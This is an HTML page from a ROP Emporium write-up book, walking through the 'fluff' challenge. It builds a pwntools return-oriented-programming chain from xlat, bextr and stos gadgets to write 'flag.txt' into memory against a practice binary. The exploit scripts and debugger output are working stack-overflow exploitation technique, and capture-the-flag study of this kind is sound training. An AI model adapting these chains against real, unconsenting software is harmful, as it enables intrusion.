@@ -1,0 +1,553 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>fluff - ROPEmporium Write-up</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introduction.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">Writeups</li><li class="chapter-item expanded "><a href="1.ret2win.html"><strong aria-hidden="true">1.</strong> ret2win</a></li><li class="chapter-item expanded "><a href="2.split.html"><strong aria-hidden="true">2.</strong> split</a></li><li class="chapter-item expanded "><a href="3.callme.html"><strong aria-hidden="true">3.</strong> callme</a></li><li class="chapter-item expanded "><a href="4.write4.html"><strong aria-hidden="true">4.</strong> write4</a></li><li class="chapter-item expanded "><a href="5.badchars.html"><strong aria-hidden="true">5.</strong> badchars</a></li><li class="chapter-item expanded "><a href="6.fluff.html" class="active"><strong aria-hidden="true">6.</strong> fluff</a></li><li class="chapter-item expanded "><a href="7.pivot.html"><strong aria-hidden="true">7.</strong> pivot</a></li><li class="chapter-item expanded "><a href="8.ret2csu.html"><strong aria-hidden="true">8.</strong> ret2csu</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">ROPEmporium Write-up</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="6-fluff"><a class="header" href="#6-fluff">6. fluff</a></h1>
+<p>the sixth challenge, the most difficult challenge by far and it took me roughly
+2 days to complete.</p>
+<p>this challenge is similar to <a href="4.write4.html"><code>write4</code></a> but now, we need to use
+more uncommon instructions to write the string into memory, the function
+<code>print_file</code> is still present in the binary.</p>
+<p>the binary doesn't contain the usual instructions such as <code>mov [reg], reg</code> for
+us to use to write into memory, so let's inspect into the binary and see what
+we can do.</p>
+<pre><code>gef➤  i func
+All defined functions:
+
+Non-debugging symbols:
+0x00000000004004d0  _init
+0x0000000000400500  pwnme@plt
+0x0000000000400510  print_file@plt
+0x0000000000400520  _start
+0x0000000000400550  _dl_relocate_static_pie
+0x0000000000400560  deregister_tm_clones
+0x0000000000400590  register_tm_clones
+0x00000000004005d0  __do_global_dtors_aux
+0x0000000000400600  frame_dummy
+0x0000000000400607  main
+0x0000000000400617  usefulFunction
+0x0000000000400628  questionableGadgets
+0x0000000000400640  __libc_csu_init
+0x00000000004006b0  __libc_csu_fini
+0x00000000004006b4  _fini
+</code></pre>
+<p>what is <code>questionableGadgets</code>??</p>
+<pre><code>gef➤  disas questionableGadgets
+Dump of assembler code for function questionableGadgets:
+   0x0000000000400628 &lt;+0&gt;:     xlat   BYTE PTR ds:[rbx]
+   0x0000000000400629 &lt;+1&gt;:     ret
+   0x000000000040062a &lt;+2&gt;:     pop    rdx
+   0x000000000040062b &lt;+3&gt;:     pop    rcx
+   0x000000000040062c &lt;+4&gt;:     add    rcx,0x3ef2
+   0x0000000000400633 &lt;+11&gt;:    bextr  rbx,rcx,rdx
+   0x0000000000400638 &lt;+16&gt;:    ret
+   0x0000000000400639 &lt;+17&gt;:    stos   BYTE PTR es:[rdi],al
+   0x000000000040063a &lt;+18&gt;:    ret
+   0x000000000040063b &lt;+19&gt;:    nop    DWORD PTR [rax+rax*1+0x0]
+End of assembler dump.
+</code></pre>
+<p>what is <code>xlat</code>??? and what is <code>bextr</code> and <code>stos</code>?? that's the question i got
+from reading what's inside the function, let's read the documentation for them.</p>
+<h3 id="what-is-xlat"><a class="header" href="#what-is-xlat">what is xlat?</a></h3>
+<p>xlat or Table Look-up Translation is an instruction that uses <code>[rbx]</code> for an
+address to memory and <code>al</code> for an index and then set the value into <code>al</code> register
+essentially it's like an array we will find in a typical programming language.</p>
+<p>for example, we have <code>rbx</code> point to <code>0x400000</code> and <code>al</code> as a value of <code>0x4</code>,
+if we have a string in memory at <code>0x400000</code> that is <code>"Hello, Ropper"</code> we will
+get <code>"o"</code> or <code>0x6f</code> set to <code>al</code> register after the instruction is completed.</p>
+<h3 id="what-is-bextr"><a class="header" href="#what-is-bextr">what is bextr?</a></h3>
+<p>bextr or Bit Field Extract is an instruction that extracts a bits from a source
+register (second operand) and put it into a destination register where length and offset is set on
+the third operand where bit 7:0 is the offset and bit 15:8 is the length.</p>
+<p>an example from <a href="https://stackoverflow.com/questions/70208751/how-does-the-bextr-instruction-in-x86-work">stackoverflow</a></p>
+<blockquote>
+<p>Say the starting bit is 5 and the length is 9. we have</p>
+</blockquote>
+<pre><code>Input : 11010010001110101010110011011010 = 0xd23aacda
+                          |-------|
+                              \
+                               \
+                                \
+                                 v
+                               |-------|
+Output: 00000000000000000000000101100110 = 0x00000166
+</code></pre>
+<h3 id="what-is-stos"><a class="header" href="#what-is-stos">what is stos?</a></h3>
+<p>stos or Store String is an instruction that stores <code>al</code> register into the address
+of <code>[rdi]</code>. this instruction is pretty straightforward and self-explainatory.</p>
+<p>so, we have an instruction to get a string to a memory from <code>[rbx]</code> to <code>al</code>,
+we have an instruction to get value of <code>rcx</code> into <code>rbx</code> and an instruction to
+store <code>al</code> into <code>[rdi]</code>.</p>
+<p>we can see where this is going. we can write <code>al</code> into specific memory address
+with <code>[rdi]</code>, we can set <code>al</code> to something with <code>[rbx + al]</code> and lastly, we can
+control <code>rbx</code> with <code>bextr</code>, all good right? well not quite...</p>
+<h3 id="how-do-we-know-where-to-point-rbx-to-get-a-string-we-want"><a class="header" href="#how-do-we-know-where-to-point-rbx-to-get-a-string-we-want">how do we know where to point <code>rbx</code> to get a string we want???</a></h3>
+<p>i stuck here for a while and i came up with an idea, how about we select the string
+from the printed strings that.</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/fluff]
+└─$ ./fluff
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+&gt;
+</code></pre>
+<p>as you can see here we have all the characters we wanted for the string <code>flag.txt</code>
+can we just point <code>rbx</code> to that right? well, as simple as it might sound it's actually
+impossible for me to do since the binary has patially RELRO, and those strings
+live inside an imported library, ahhhhhhhhhh...</p>
+<p>but wait, we can just leak the  library address right since we can do pretty
+much all we want, well, the binary doesn't import any other things except the
+library that is provided by the challenge.</p>
+<p>so we can't leak the address of the library to point it to the printed strings
+in the beginning.</p>
+<p>i stuck here for the rest of the day.</p>
+<p>day 2, my co-worker (shout out to him), told me that since we can point to
+anywhere we want just point it to the address in the binary itself, since random
+addresses can contain a byte that represent a character that we wanted, and
+<strong>THAT IS BRILLIANT</strong>.</p>
+<p>so i tried searching with <code>ropper</code> and there it is!</p>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/fluff]
+└─$ ropper --string "f|l|a|g|.|t|x" -f fluff | awk '{ print $2, $1 }' | sort
+ =======
+. 0x0040024e
+. 0x00400251
+. 0x004003c9
+. 0x004003fd
+. 0x00400400
+. 0x00400434
+. 0x00400436
+. 0x00400439
+----- -------
+a 0x004003d6
+a 0x0040040c
+a 0x00400411
+a 0x00400418
+a 0x0040041a
+a 0x00400424
+f 0x004003c4
+f 0x004003c7
+f 0x004003c8
+f 0x004003e2
+f 0x004003f4
+g 0x004003cf
+g 0x004007a0
+l 0x00400239
+l 0x0040023f
+l 0x00400242
+l 0x004003c1
+l 0x004003c5
+l 0x004003e4
+l 0x004003f9
+l 0x00400405
+t 0x004003d5
+t 0x004003d8
+t 0x004003e0
+t 0x004003f1
+t 0x0040040b
+t 0x0040040e
+t 0x00400419
+t 0x00400423
+t 0x00400426
+t 0x004006cb
+t 0x004006ce
+Value Address
+x 0x00400246
+x 0x00400248
+x 0x004006c8
+x 0x00400725
+x 0x00400751
+x 0x00400778
+x 0x004007bc
+ Strings
+</code></pre>
+<p>that's all we wanted for the string <code>flag.txt</code>, let's craft the payload!</p>
+<pre><code class="language-python">from pwn import *
+
+pop_rdi = 0x4006a3
+stos = 0x400639
+xlat = 0x400628
+
+# pop rdx, pop rcx, add rcx,0x3ef2, bextr rbx,rcx,rdx
+bextr = 0x40062a
+add_rcx = 0x3ef2
+
+print_file = 0x400510
+data_sec = 0x601028
+padding = b"x" * 40
+
+p = process("./fluff")
+gdb.attach(p, """
+           break *0x40062a
+           break *0x400628
+           break print_file
+           """)
+
+payload = padding + p64(bextr) + p64(0x4000) + p64(0x004003c4 - add_rcx)
+payload += p64(xlat) + p64(pop_rdi) + p64(data_sec) + p64(stos)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>let's can try this and see if it works.</p>
+<pre><code>     0x400626 &lt;usefulFunction+15&gt; pop    rbp
+     0x400627 &lt;usefulFunction+16&gt; ret
+●    0x400628 &lt;questionableGadgets+0&gt; xlat   BYTE PTR ds:[rbx]
+ →   0x400629 &lt;questionableGadgets+1&gt; ret
+   ↳    0x4006a3 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x4006a4 &lt;__libc_csu_init+100&gt; ret
+        0x4006a5                  nop
+        0x4006a6                  cs     nop WORD PTR [rax+rax*1+0x0]
+        0x4006b0 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x4006b2                  add    BYTE PTR [rax], al
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "fluff", stopped 0x400629 in questionableGadgets (), reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400629 → questionableGadgets()
+[#1] 0x4006a3 → __libc_csu_init()
+[#2] 0x400639 → questionableGadgets()
+[#3] 0x4006a3 → __libc_csu_init()
+[#4] 0x400510 → pwnme@plt()
+[#5] 0x7fff5414a80a → in eax, dx
+[#6] 0x7fb4d4414000 →  &lt;_rtld_global+0&gt; rcl BYTE PTR [rdx+0x41], 0xd4
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rax
+rax            0x67                0x67
+</code></pre>
+<p>wait, why do we get <code>0x67</code> it should be <code>0x66</code> what's going on? let's try that
+again and see the register before <code>xlat</code> maybe <code>rax</code> is something before <code>xlat</code>
+and that might interfere with our payload.</p>
+<pre><code>●→   0x400628 &lt;questionableGadgets+0&gt; xlat   BYTE PTR ds:[rbx]
+     0x400629 &lt;questionableGadgets+1&gt; ret
+●    0x40062a &lt;questionableGadgets+2&gt; pop    rdx
+     0x40062b &lt;questionableGadgets+3&gt; pop    rcx
+     0x40062c &lt;questionableGadgets+4&gt; add    rcx, 0x3ef2
+     0x400633 &lt;questionableGadgets+11&gt; bextr  rbx, rcx, rdx
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "fluff", stopped 0x400628 in questionableGadgets (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400628 → questionableGadgets()
+[#1] 0x4006a3 → __libc_csu_init()
+[#2] 0x400639 → questionableGadgets()
+[#3] 0x4006a3 → __libc_csu_init()
+[#4] 0x400510 → pwnme@plt()
+[#5] 0x7fff5414a80a → in eax, dx
+[#6] 0x7fb4d4414000 →  &lt;_rtld_global+0&gt; rcl BYTE PTR [rdx+0x41], 0xd4
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rax
+rax            0xb                 0xb
+</code></pre>
+<p>i see, that's why we don't get <code>0x66</code> or <code>f</code>, the offset might point to something else,
+so let's calculate where we are going to point to before <code>xlat</code> is executed by
+subtracting <code>0xb</code> from the address.</p>
+<pre><code class="language-python">...
+payload = padding + p64(bextr) + p64(0x4000) + p64(0x004003c4 - add_rcx - 0xb)
+...
+</code></pre>
+<pre><code>     0x400626 &lt;usefulFunction+15&gt; pop    rbp
+     0x400627 &lt;usefulFunction+16&gt; ret
+●    0x400628 &lt;questionableGadgets+0&gt; xlat   BYTE PTR ds:[rbx]
+ →   0x400629 &lt;questionableGadgets+1&gt; ret
+   ↳    0x4006a3 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x4006a4 &lt;__libc_csu_init+100&gt; ret
+        0x4006a5                  nop
+        0x4006a6                  cs     nop WORD PTR [rax+rax*1+0x0]
+        0x4006b0 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x4006b2                  add    BYTE PTR [rax], al
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "fluff", stopped 0x400629 in questionableGadgets (), reason: SINGLE STEP
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400629 → questionableGadgets()
+[#1] 0x4006a3 → __libc_csu_init()
+[#2] 0x400639 → questionableGadgets()
+[#3] 0x4006a3 → __libc_csu_init()
+[#4] 0x400510 → pwnme@plt()
+[#5] 0x7ffc6a50100a → rex add BYTE PTR [rax], al
+[#6] 0x7feda750d000 →  &lt;_rtld_global+0&gt; shl dl, 0x50
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rax
+rax            0x66                0x66
+</code></pre>
+<p>yeah! that's what we wanted now let's craft the full payload.
+remember that everytime we get a character out, our <code>al</code> is gonna change so we
+have to calculate for the last string we wrote into the memory.</p>
+<pre><code class="language-python">from pwn import *
+
+pop_rdi = 0x4006a3
+stos = 0x400639
+xlat = 0x400628
+
+# pop rdx, pop rcx, add rcx,0x3ef2, bextr rbx,rcx,rdx
+bextr = 0x40062a
+add_rcx = 0x3ef2
+
+print_file = 0x400510
+data_sec = 0x601028
+padding = b"x" * 40
+
+p = process("./fluff")
+gdb.attach(p, """
+           break *0x40062a
+           break *0x400628
+           break print_file
+           """)
+
+def writeToMem(addr, index, al = 0xb):
+    return p64(bextr) + p64(0x4000) + p64(addr - add_rcx - al) + p64(xlat) + p64(pop_rdi) + p64(data_sec + index) + p64(stos)
+
+flag_file = "flag.txt"
+flagList = [0x004003c4, 0x00400239, 0x004003d6, 0x004003cf, 0x0040024e, 0x004003d5, 0x00400246 ,0x004003d5]
+
+payload = padding + writeToMem(flagList[0], 0)
+
+for i, char in enumerate(flag_file):
+    # we already wrote the first character, and we only loop for the recently added character
+    if i == len(flag_file) - 1:
+        break
+
+    payload += writeToMem(flagList[i + 1], i + 1, ord(char))
+
+payload += p64(pop_rdi) + p64(data_sec) + p64(print_file)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<pre><code>┌──(kali㉿kali)-[~/ctf/rop/fluff]
+└─$ python solve.py
+[+] Starting local process './fluff': pid 58410
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './fluff', '58410', '-x', '/tmp/pwncifz4jv2.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+fluff by ROP Emporium
+x86_64
+
+You know changing these strings means I have to rewrite my solutions...
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>finally, we got the flag, i learnt a really neat trick from this challenge,
+to be honest, this challenge was very difficult for me but it's pretty fun using
+uncommon instructions so yeah nicesu nicesu!!</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="5.badchars.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="7.pivot.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="5.badchars.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="7.pivot.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
